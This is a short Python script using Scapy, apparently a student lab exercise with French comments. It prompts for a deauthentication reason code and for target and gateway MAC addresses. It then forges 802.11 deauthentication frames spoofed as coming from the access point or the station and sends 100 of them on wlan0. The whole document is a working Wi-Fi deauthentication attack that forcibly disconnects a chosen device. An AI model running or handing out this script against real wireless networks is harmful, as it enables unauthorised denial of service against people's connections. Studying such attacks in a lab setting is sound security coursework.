#Auteurs : Peguiron Adrien, Viotti Nicolas
from doctest import FAIL_FAST
from scapy.all import *
import sys
import re

reason = 0
while reason != 1 and reason != 4 and reason != 5 and reason != 8 :
    reason = int(input("Veuillez enter une raison entre 1, 4, 5 et 8\n"))
# grandement inspiré de https://www.thepythoncode.com/article/force-a-device-to-disconnect-scapy

#Regex pour vérifier l'adresse MAC entrée
regex = "^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})|([0-9a-fA-F]{4}\\.[0-9a-fA-F]{4}\\.[0-9a-fA-F]{4})$"
target=False
gateway=False

while not target:
    target_mac = input("Entrez l'adresse MAC de la cible\n")
    target = re.search(regex, target_mac)

while not gateway:
    gateway_mac = input("Entrez l'adresse MAC de la gateway\n")
    gateway = re.search(regex, gateway_mac)


# 802.11 frame
# addr1: destination MAC
# addr2: source MAC
# addr3: Access Point MAC
if (reason == 8) : # envoie de la STA à l'AP
    dot11 = Dot11(addr1=gateway_mac, addr2=target_mac, addr3=gateway_mac)
else : # envoie de l'AP à la STA
    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
# Stacking des infos
packet = RadioTap()/dot11/Dot11Deauth(reason=reason)
# Envoi du paquet
sendp(packet, inter=0.1, count=100, iface="wlan0", verbose=1)